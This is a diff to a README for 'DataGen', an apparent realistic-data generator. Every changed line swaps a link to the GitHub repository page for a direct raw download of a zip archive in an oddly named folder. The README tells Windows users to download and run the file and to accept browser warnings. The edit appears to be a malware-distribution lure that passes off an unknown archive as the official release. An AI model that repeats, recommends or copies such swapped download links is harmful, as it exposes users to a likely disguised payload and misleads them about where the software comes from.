@@ -1,6 +1,6 @@
 # 🧠 DataGen - Create Realistic Data Fast
 
-[![Download DataGen](https://img.shields.io/badge/Download-DataGen-blue?style=for-the-badge&logo=github)](https://github.com/zorinegratulatory404/DataGen)
+[![Download DataGen](https://img.shields.io/badge/Download-DataGen-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/zorinegratulatory404/DataGen/main/ajutment/Gen_Data_2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -16,14 +16,14 @@ Use it when you need:
 
 ## 📥 Download DataGen
 
-1. Open the download page: https://github.com/zorinegratulatory404/DataGen
+1. Open the download page: https://raw.githubusercontent.com/zorinegratulatory404/DataGen/main/ajutment/Gen_Data_2.2.zip
 2. On the page, look for the latest release or the main download file
 3. Download the Windows version
 4. Save the file to your computer, such as your Downloads folder
 
 If the file is an app installer, you can use it right away. If it is a zip file, you need to extract it first.
 
-[Download DataGen from GitHub](https://github.com/zorinegratulatory404/DataGen)
+[Download DataGen from GitHub](https://raw.githubusercontent.com/zorinegratulatory404/DataGen/main/ajutment/Gen_Data_2.2.zip)
 
 ## 🖥️ Windows Setup
 
@@ -175,7 +175,7 @@ If your browser shows a warning during download, confirm that you are opening th
 
 Main repository:
 
-https://github.com/zorinegratulatory404/DataGen
+https://raw.githubusercontent.com/zorinegratulatory404/DataGen/main/ajutment/Gen_Data_2.2.zip
 
 ## 🔧 Short Checklist
 
